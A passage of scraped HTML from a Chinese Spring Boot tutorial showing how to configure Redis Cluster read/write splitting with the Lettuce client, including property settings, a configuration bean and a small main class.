class=\"crayon-o\">&gt;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0266 seconds] -->\r\n<p>（2）springboot的配置文件要包含如下内容：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab671054329508519506\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nspring.redis.database=0\r\nspring.redis.lettuce.pool.max-idle=10\r\nspring.redis.lettuce.pool.max-wait=500\r\nspring.redis.cluster.timeout=1000\r\nspring.redis.cluster.max-redirects=3\r\n\r\nspring.redis.cluster.nodes=172.20.52.85:7000,172.20.52.85:7001,172.20.52.85:7002,172.20.52.85:7003,172.20.52.85:7004,172.20.52.85:7005   </textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab671054329508519506-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054329508519506-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054329508519506-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054329508519506-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054329508519506-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054329508519506-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054329508519506-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab671054329508519506-1\"><span class=\"crayon-v\">spring</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">database</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054329508519506-2\"><span class=\"crayon-v\">spring</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">lettuce</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">pool</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">max</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">idle</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">10</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054329508519506-3\"><span class=\"crayon-v\">spring</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">lettuce</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">pool</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">max</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">wait</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">500</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054329508519506-4\"><span class=\"crayon-v\">spring</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">cluster</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">timeout</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1000</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054329508519506-5\"><span class=\"crayon-v\">spring</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">cluster</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">max</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">redirects</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">3</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054329508519506-6\"> </div><div class=\"crayon-line\" id=\"crayon-5bab671054329508519506-7\"><span class=\"crayon-v\">spring</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">cluster</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nodes</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">172.20.52.85</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">7000</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">172.20.52.85</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">7001</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">172.20.52.85</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">7002</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">172.20.52.85</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">7003</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">172.20.52.85</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">7004</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">172.20.52.85</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">7005</span><span class=\"crayon-h\">   </span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0274 seconds] -->\r\n<p>（3）我们回到RedisConfiguration类中，删除或屏蔽之前的RedisTemplate方法，新增自定义的redisClusterConnection方法，并且设置好读写分离，参考代码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67105432c771085540\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n@Configuration\r\npublic class RedisConfiguration {\r\n\r\n @Autowired\r\n private Environment environment;\r\n\r\n\r\n &lt;a href='http://www.jobbole.com/members/q890462235'&gt;@Bean&lt;/a&gt;\r\n public StatefulRedisClusterConnection redisClusterConnection(){\r\n\r\n String strRedisClusterNodes = environment.getProperty(\"spring.redis.cluster.nodes\");\r\n String[] listNodesInfos = strRedisClusterNodes.split(\",\");\r\n\r\n List&lt;RedisURI&gt; listRedisURIs = new ArrayList&lt;RedisURI&gt;();\r\n for(String tmpNodeInfo : listNodesInfos){\r\n String[] tmpInfo = tmpNodeInfo.split(\":\");\r\n listRedisURIs.add(new RedisURI(tmpInfo[0],Integer.parseInt(tmpInfo[1]),Duration.ofDays(10)));\r\n }\r\n\r\n RedisClusterClient clusterClient = RedisClusterClient.create(listRedisURIs);\r\n StatefulRedisClusterConnection&lt;String, String&gt; connection = clusterClient.connect();\r\n connection.setReadFrom(ReadFrom.SLAVE);\r\n\r\n return connection;\r\n }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67105432c771085540-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67105432c771085540-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab67105432c771085540-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67105432c771085540-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab67105432c771085540-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67105432c771085540-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab67105432c771085540-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67105432c771085540-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab67105432c771085540-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67105432c771085540-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab67105432c771085540-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67105432c771085540-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab67105432c771085540-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67105432c771085540-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab67105432c771085540-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67105432c771085540-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab67105432c771085540-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67105432c771085540-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab67105432c771085540-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67105432c771085540-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5bab67105432c771085540-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67105432c771085540-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5bab67105432c771085540-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67105432c771085540-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5bab67105432c771085540-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67105432c771085540-26\">26</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67105432c771085540-1\"><span class=\"crayon-sy\">@</span><span class=\"crayon-e\">Configuration</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67105432c771085540-2\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">RedisConfiguration</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab67105432c771085540-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67105432c771085540-4\"><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">@</span><span class=\"crayon-e\">Autowired</span></div><div class=\"crayon-line\" id=\"crayon-5bab67105432c771085540-5\"><span class=\"crayon-e\"> </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Environment </span><span class=\"crayon-v\">environment</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67105432c771085540-6\"> </div><div class=\"crayon-line\" id=\"crayon-5bab67105432c771085540-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67105432c771085540-8\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">href</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'http://www.jobbole.com/members/q890462235'</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">Bean</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">a</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5bab67105432c771085540-9\"><span class=\"crayon-h\"> </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">StatefulRedisClusterConnection </span><span class=\"crayon-e\">redisClusterConnection</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67105432c771085540-10\"> </div><div class=\"crayon-line\" id=\"crayon-5bab67105432c771085540-11\"><span class=\"crayon-h\"> </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">strRedisClusterNodes</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">environment</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getProperty</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"spring.redis.cluster.nodes\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67105432c771085540-12\"><span class=\"crayon-h\"> </span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">listNodesInfos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">strRedisClusterNodes</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">split</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\",\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab67105432c771085540-13\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67105432c771085540-14\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">List</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">RedisURI</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">listRedisURIs</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ArrayList</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">RedisURI</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab67105432c771085540-15\"><span class=\"crayon-h\"> </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tmpNodeInfo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">listNodesInfos</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67105432c771085540-16\"><span class=\"crayon-h\"> </span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tmpInfo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tmpNodeInfo</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">split</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\":\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab67105432c771085540-17\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">listRedisURIs</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">RedisURI</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">tmpInfo</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-t\">Integer</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">parseInt</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">tmpInfo</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">Duration</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">ofDays</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67105432c771085540-18\"><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab67105432c771085540-19\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67105432c771085540-20\"><span class=\"crayon-h\"> </span><span class=\"crayon-e\">RedisClusterClient </span><span class=\"crayon-v\">clusterClient</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">RedisClusterClient</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">create</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">listRedisURIs</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab67105432c771085540-21\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">StatefulRedisClusterConnection</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">String</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">connection</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">clusterClient</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">connect</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67105432c771085540-22\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">connection</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setReadFrom</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ReadFrom</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">SLAVE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab67105432c771085540-23\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67105432c771085540-24\"><span class=\"crayon-h\"> </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">connection</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab67105432c771085540-25\"><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67105432c771085540-26\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0217 seconds] -->\r\n<p>其中，这三行代码是能进行redis-cluster架构下读写分离的核心：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab671054331332340593\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nRedisClusterClient clusterClient  = RedisClusterClient.create(listRedisURIs);\r\nStatefulRedisClusterConnection&lt;String, String&gt; connection = clusterClient.connect();\r\nconnection.setReadFrom(ReadFrom.SLAVE);  </textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab671054331332340593-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054331332340593-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054331332340593-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab671054331332340593-1\"><span class=\"crayon-e\">RedisClusterClient </span><span class=\"crayon-v\">clusterClient</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">RedisClusterClient</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">create</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">listRedisURIs</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054331332340593-2\"><span class=\"crayon-v\">StatefulRedisClusterConnection</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">String</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">connection</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">clusterClient</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">connect</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054331332340593-3\"><span class=\"crayon-v\">connection</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setReadFrom</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ReadFrom</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">SLAVE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p>在业务类service中注入Lettuce相关的redisClusterConnection，进行相关读写操作。以下是我直接化简到了springbootstarter中进行，参考代码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab671054334759364269\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n@SpringBootApplication\r\npublic class NewRedisClientApplication {\r\n\r\n    public static void main(String[] args) {\r\n        ApplicationContext context = SpringApplication.run(NewRedisClientApplication.class, args);\r\n\r\n        StatefulRedisClusterConnection&lt;String, String&gt; redisClusterConnection = (StatefulRedisClusterConnection)context.getBean(\"redisClusterConnection\");\r\n        System.out.println(redisClusterConnection.sync().get(\"event:10\"));\r\n\r\n\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab671054334759364269-1\">1</div><div class=\"crayon-num crayon-striped-num\" 